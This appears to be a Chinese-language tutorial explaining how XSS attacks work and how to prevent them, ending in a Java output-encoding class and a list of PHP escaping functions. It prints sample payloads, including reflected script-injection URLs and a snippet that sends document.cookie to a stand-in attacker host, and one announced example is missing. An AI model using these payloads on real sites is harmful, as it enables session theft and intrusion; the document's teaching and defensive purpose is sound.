# xss攻击原理与解决方法

XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器 执行，达到攻击的目的，形成了一次有效XSS攻击，一旦攻击成功，它可以获取用户的联系人列 表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。

## 攻击的条件 {#攻击的条件}

实施XSS攻击需要具备两个条件：

一、需要向web页面注入恶意代码；

二、这些恶意代码能够被浏览器成功的执行。

看一下下面这个例子：

```
<div id="el" style="background:url('javascript:eval(document.getElementById("el").getAttribute("code")) ')"

        code="var a = document.createElement('a');

        a.innerHTML= '执行了恶意代码';document.body.appendChild(a);

        //这这里执行代码

        "></div>
```

这段代码在旧版的IE8和IE8以下的版本都是可以被执行的，火狐也能执行代码，但火狐对其禁止访问DOM对象，所以在火狐下执行将会看到控制里抛出异常：document is not defined （document是没有定义的）

再来看一下面这段代码：

```
<div>

  <img src="/images/handler.ashx?id=<%= Request.QueryString["id"] %>" />

  </div>
```

相信很多程序员都觉得这个代码很正常，其实这个代码就存在一个反射型的XSS攻击，假如输入下面的地址：

```
http://www.xxx.com/?id=" /><script>alert(/xss/)</script><br x="

最终反射出来的HTML代码：

    <div>

    <img src="/images/handler.ashx?id=" /><script>alert(/xss/)</script><br x="" />
    </div>
```

也许您会觉得把ValidateRequest设置为true或者保持默认值就能高枕无忧了，其实这种情况还可以输入下面的地址达到相同的攻击效果：

```
http://www.xxx.com/?id=xx" οnerrοr="this.onload()" οnlοad="alert(/xss/)" x="
```

## 根据XSS攻击的效果可以分为几种类型 {#根据xss攻击的效果可以分为几种类型}

第一、XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。

第二、XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。

## XSS攻击能做些什么 {#xss攻击能做些什么}

1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：

```
var i=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
```

2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等，如代码：

## 解决方法 {#解决方法}

一种方法是在表单提交或者url参数传递前，对需要的参数进行过滤,请看如下XSS过滤工具类代码

```
import java.net.URLEncoder;

/**
 * 过滤非法字符工具类
 * 
 */
public class EncodeFilter {

    //过滤大部分html字符
    public static String encode(String input) {
        if (input == null) {
            return input;
        }
        StringBuilder sb = new StringBuilder(input.length());
        for (int i = 0, c = input.length(); i < c; i++) {
            char ch = input.charAt(i);
            switch (ch) {
                case '&': sb.append("&amp;");
                    break;
                case '<': sb.append("&lt;");
                    break;
                case '>': sb.append("&gt;");
                    break;
                case '"': sb.append("&quot;");
                    break;
                case '\'': sb.append("&#x27;");
                    break;
                case '/': sb.append("&#x2F;");
                    break;
                default: sb.append(ch);
            }
        }
        return sb.toString();
    }

    //js端过滤
    public static String encodeForJS(String input) {
        if (input == null) {
            return input;
        }

        StringBuilder sb = new StringBuilder(input.length());

        for (int i = 0, c = input.length(); i < c; i++) {
            char ch = input.charAt(i);

            // do not encode alphanumeric characters and ',' '.' '_'
            if (ch >= 'a' && ch <= 'z' || ch >= 'A' && ch <= 'Z' ||
                    ch >= '0' && ch <= '9' ||
                    ch == ',' || ch == '.' || ch == '_') {
                sb.append(ch);
            } else {
                String temp = Integer.toHexString(ch);

                // encode up to 256 with \\xHH
                if (ch < 256) {
                    sb.append('\\').append('x');
                    if (temp.length() == 1) {
                        sb.append('0');
                    }
                    sb.append(temp.toLowerCase());

                // otherwise encode with \\uHHHH
                } else {
                    sb.append('\\').append('u');
                    for (int j = 0, d = 4 - temp.length(); j < d; j ++) {
                        sb.append('0');
                    }
                    sb.append(temp.toUpperCase());
                }
            }
        }

        return sb.toString();
    }

    /**
     * css非法字符过滤
     * http://www.w3.org/TR/CSS21/syndata.html#escaped-characters
    */
    public static String encodeForCSS(String input) {
        if (input == null) {
            return input;
        }

        StringBuilder sb = new StringBuilder(input.length());

        for (int i = 0, c = input.length(); i < c; i++) {
            char ch = input.charAt(i);

            // check for alphanumeric characters
            if (ch >= 'a' && ch <= 'z' || ch >= 'A' && ch <= 'Z' ||
                    ch >= '0' && ch <= '9') {
                sb.append(ch);
            } else {
                // return the hex and end in whitespace to terminate
                sb.append('\\').append(Integer.toHexString(ch)).append(' ');
            }
        }
        return sb.toString();
    }

    /**
     * URL参数编码 
     * http://en.wikipedia.org/wiki/Percent-encoding
     */ 
    public static String encodeURIComponent(String input) {
        return encodeURIComponent(input, "utf-8");
    }

    public static String encodeURIComponent(String input, String encoding) {
        if (input == null) {
            return input;
        }
        String result;
        try {
            result = URLEncoder.encode(input, encoding);
        } catch (Exception e) {
            result = "";
        }
        return result;
    }

    public static boolean isValidURL(String input) {
        if (input == null || input.length() < 8) {
            return false;
        }
        char ch0 = input.charAt(0);
        if (ch0 == 'h') {
            if (input.charAt(1) == 't' &&
                input.charAt(2) == 't' &&
                input.charAt(3) == 'p') {
                char ch4 = input.charAt(4);
                if (ch4 == ':') {
                    if (input.charAt(5) == '/' &&
                        input.charAt(6) == '/') {

                        return isValidURLChar(input, 7);
                    } else {
                        return false;
                    }
                } else if (ch4 == 's') {
                    if (input.charAt(5) == ':' &&
                        input.charAt(6) == '/' &&
                        input.charAt(7) == '/') {

                        return isValidURLChar(input, 8);
                    } else {
                        return false;
                    }
                } else {
                    return false;
                }
            } else {
                return false;
            }

        } else if (ch0 == 'f') {
            if( input.charAt(1) == 't' &&
                input.charAt(2) == 'p' &&
                input.charAt(3) == ':' &&
                input.charAt(4) == '/' &&
                input.charAt(5) == '/') {

                return isValidURLChar(input, 6);
            } else {
                return false;
            }
        }
        return false;
    }

    static boolean isValidURLChar(String url, int start) {
        for (int i = start, c = url.length(); i < c; i ++) {
            char ch = url.charAt(i);
            if (ch == '"' || ch == '\'') {
                return false;
            }
        }
        return true;
    }

}
```

二、 过滤用户输入的 检查用户输入的内容中是否有非法内容。如&lt;&gt;（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、\(\)（括号）、&（& 符号）、+（加号）等。、严格控制输出

```
可以利用下面这些函数对出现xss漏洞的参数进行过滤

1、htmlspecialchars() 函数,用于转义处理在页面上显示的文本。

2、htmlentities() 函数,用于转义处理在页面上显示的文本。

3、strip_tags() 函数,过滤掉输入、输出里面的恶意标签。

4、header() 函数,使用header("Content-type:application/json"); 用于控制 json 数据的头部，不用于浏览。

5、urlencode() 函数,用于输出处理字符型参数带入页面链接中。

6、intval() 函数用于处理数值型参数输出页面中。

7、自定义函数,在大多情况下，要使用一些常用的 html 标签，以美化页面显示，如留言、小纸条。那么在这样的情况下，要采用白名单的方法使用合法的标签显示，过滤掉非法的字符。

各语言示例：

  PHP的htmlentities()或是htmlspecialchars()。
   Python的cgi.escape()。
   ASP的Server.HTMLEncode()。
   ASP.NET的Server.HtmlEncode()或功能更强的Microsoft Anti-Cross Site Scripting Library
   Java的xssprotect(Open Source Library)。
   Node.js的node-validator。
```



